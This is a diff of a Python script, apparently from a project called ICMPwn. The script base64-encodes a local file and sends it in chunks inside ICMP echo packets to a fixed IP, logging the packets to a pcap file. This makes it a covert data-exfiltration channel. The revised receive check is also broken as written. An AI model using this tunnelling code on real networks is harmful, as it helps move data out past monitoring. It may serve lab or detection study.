@@ -2,21 +2,26 @@ import base64
 import time
 import os
 from base64 import b64encode
+
 from scapy.all import IP, ICMP, Raw, send, wrpcap, sniff
 import zlib
-from typing import Optional
+
+from ICMPwn.empfänger import process_packet
+
 
 # Function to calculate CRC32 checksum
-def calculate_crc(data: bytes) -> int:
+def calculate_crc(data):
     return zlib.crc32(data) & 0xFFFFFFFF
 
-def initialize_pcap_file(pcap_file: str) -> None:
+def initialize_pcap_file(pcap_file):
     if os.path.exists(pcap_file):
-        os.remove(pcap_file)
+        os.remove(pcap_file)  # Delete the file if it exists
+    # Optionally create an empty file (not required for Scapy)
     with open(pcap_file, "wb") as f:
         pass
 
-def send_icmp_packet(data: bytes, ip_dst: str, packet_number: int, pcap_file: str) -> None:
+# Function to send data via ICMP and save to pcap
+def send_icmp_packet(data, ip_dst, packet_number, pcap_file):
     checksum = calculate_crc(data)
     packet = (
         IP(dst=ip_dst)
@@ -25,76 +30,48 @@ def send_icmp_packet(data: bytes, ip_dst: str, packet_number: int, pcap_file: st
     )
     print(f"Sending packet {packet_number} to {ip_dst}")
     send(packet)
-    wrpcap(pcap_file, packet, append=True)
+    wrpcap(pcap_file, packet, append=True)  # Save packet to .pcap
 
-def process_verification_packet(packet) -> Optional[bool]:
-    """Process verification packets from receiver"""
-    if packet.haslayer(ICMP) and packet[ICMP].type == 0:  # Echo reply
-        try:
-            raw_data = packet[Raw].load
-            # Last byte indicates verification status
-            status = raw_data[-1]
-            return status == 1
-        except:
-            return None
-    return None
+def receive_checksum(packet):
+    ip_dst = "192.168.0.69"         # Target IP
+    if packet.haslayer(ICMP) and packet[ICMP].type == 8:
+        raw_data = packet[Raw].load
+        checksum_value = int.from_bytes(raw_data, byteorder='big')
+        return checksum_value
 
-def wait_for_verification(timeout: int = 5) -> bool:
-    """Wait for verification packet with timeout"""
-    start_time = time.time()
-    while time.time() - start_time < timeout:
-        packets = sniff(filter="icmp", count=1, timeout=1)
-        if packets:
-            result = process_verification_packet(packets[0])
-            if result is not None:
-                return result
-    return False
-
+# Main logic
 def main():
-    filename = "./Robotergesetze.txt"
-    ip_dst = "172.16.10.36"
-    packet_size = 1400
+    filename = "./Robotergesetze.txt"  # File to read
+    ip_dst = "172.16.10.36"         # Target IP
+    packet_size = 1400               # Max ICMP packet size
     pcap_file = "sent_packets.pcap"
-    max_retries = 3
-    
     initialize_pcap_file(pcap_file)
-    
+
+    # Read and encode the file
     if not os.path.exists(filename):
         raise FileNotFoundError(f"The file {filename} does not exist.")
-    
     with open(filename, 'r') as file:
         data = file.read()
     encoded_data = base64.b64encode(data.encode())
     
     packet_number = 1
-    position = 0
-    
-    while position < len(encoded_data):
-        current_packet_data = encoded_data[position:position + packet_size]
+    while encoded_data:
+        current_packet_data = encoded_data[:packet_size]
+        encoded_data = encoded_data[packet_size:]
         
-        retries = 0
-        packet_verified = False
+        send_icmp_packet(current_packet_data, ip_dst, packet_number, pcap_file)
         
-        while not packet_verified and retries < max_retries:
-            send_icmp_packet(current_packet_data, ip_dst, packet_number, pcap_file)
-            
-            # Wait for verification packet
-            packet_verified = wait_for_verification()
-            
-            if not packet_verified:
-                print(f"Packet {packet_number} verification failed. Retrying... ({retries + 1}/{max_retries})")
-                retries += 1
-                time.sleep(1)
-        
-        if packet_verified:
-            print(f"Packet {packet_number} verified successfully")
-            position += packet_size
+        time.sleep(5)
+
+        value = sniff(filter="icmp", prn=receive_checksum, store=False)
+        print(f"value: {value}")
+        if value == 1:
             packet_number += 1
         else:
-            print(f"Failed to verify packet {packet_number} after {max_retries} attempts. Exiting...")
             break
-        
-        time.sleep(0.1)  # Small delay between packets
+
 
 if __name__ == "__main__":
     main()
+
+
